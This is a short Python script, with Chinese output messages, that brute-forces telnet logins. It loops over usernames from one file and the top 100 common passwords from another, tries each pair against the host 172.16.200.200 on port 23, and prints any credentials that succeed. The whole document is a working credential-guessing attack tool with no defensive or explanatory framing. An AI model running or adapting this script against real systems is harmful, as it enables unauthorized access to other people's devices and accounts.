import telnetlib


def telnet(user, pwd):
    try:
        tn = telnetlib.Telnet("172.16.200.200", port=23, timeout=10)
        tn.read_until(b'login: ')
        tn.write((user + '\n').encode('ascii'))
        while 1:
            text = str(tn.read_some())
            if 'incorrect' in text:
                print('失败')
                return 0
            elif 'Password:' in text:
                tn.write((pwd + '\n').encode('ascii'))
            elif '$' in text:
                print('爆破成功。  账号：%s；密码：%s' % (user, pwd))
                return 1
    except:
        print('失败')


user = open('user.txt')
for line in user:
    user = line.strip('\n')
    pwd = open('top100.txt')
    for line in pwd:
        pwd = line.strip('\n')
        print(user + ':' + pwd)
        text=telnet(user, pwd)
        if text:
            break